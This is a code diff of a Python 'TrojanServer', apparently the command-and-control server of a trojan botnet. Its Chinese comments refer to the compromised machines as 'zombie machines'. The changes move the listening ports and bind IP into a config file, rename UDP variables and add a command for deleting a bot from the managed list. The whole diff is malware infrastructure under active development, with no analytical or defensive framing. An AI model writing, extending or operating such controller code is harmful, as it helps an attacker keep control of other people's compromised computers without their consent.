@@ -1,9 +1,13 @@
+import configparser
 import os
 import pickle
 import socket
 import time
 from queue import Queue
 from threading import Thread
+
+config = configparser.ConfigParser()
+config.read('config.ini', 'utf8')
 
 
 class Chienken:
@@ -28,11 +32,13 @@ class TrojanServer:
 
         self.allChickens = []  # 所有肉鸡
         self.cmdQ = Queue()
+
+
         # configs
-        self.utpPort = 8089
-        self.utpRecvPort = 8083
-        self.tcpPort = 8877
-        self.bind_IP = '100.95.220.133'
+        self.udpPort = config.getint('server', 'udpSendPort')
+        self.udpRecvPort = config.getint('server', 'udpRecvPort')
+        self.tcpPort = config.getint('server', 'tcpPort')
+        self.bind_IP = config.get('server', 'ip')
         # self.bind_IP = '127.0.0.1'
         self.ck = -1  # 当前选中的肉鸡序号
         self.enMsg = False  # 是否显示肉鸡消息
@@ -42,10 +48,10 @@ class TrojanServer:
         self.tcpSocket.listen(5)
 
         self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.udpSocket.bind((self.bind_IP, self.utpPort))
+        self.udpSocket.bind((self.bind_IP, self.udpPort))
 
         self.utpRecvSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.utpRecvSocket.bind((self.bind_IP, self.utpRecvPort))
+        self.utpRecvSocket.bind((self.bind_IP, self.udpRecvPort))
 
         self.udpQ = Queue()
         self.udpS = Thread(target=self.udpSend)
@@ -98,6 +104,9 @@ class TrojanServer:
             elif "select" == cmd[0]:
                 self.ck = int(cmd[1])
                 self.selectChicken(self.ck)
+            elif "delete" == cmd[0]:
+                self.allChickens.pop(int(cmd[1]))
+                self.signals.refreshSignal.emit()
             elif "rename" == cmd[0]:
                 self.renameChicken(int(cmd[1]), cmd[2])
             elif "save" == cmd[0]:
@@ -202,7 +211,7 @@ class TrojanServer:
             data, addr = self.utpRecvSocket.recvfrom(1024)
             self.chickenUp(Chienken(addr[0], addr[1], addr[0]))
             if self.enMsg:
-                print("Received from %s:%d" % (addr, self.utpPort))
+                print("Received from %s:%d" % (addr, self.udpPort))
                 print(data.decode('utf8'))
 
     def tcpSend(self, socket):
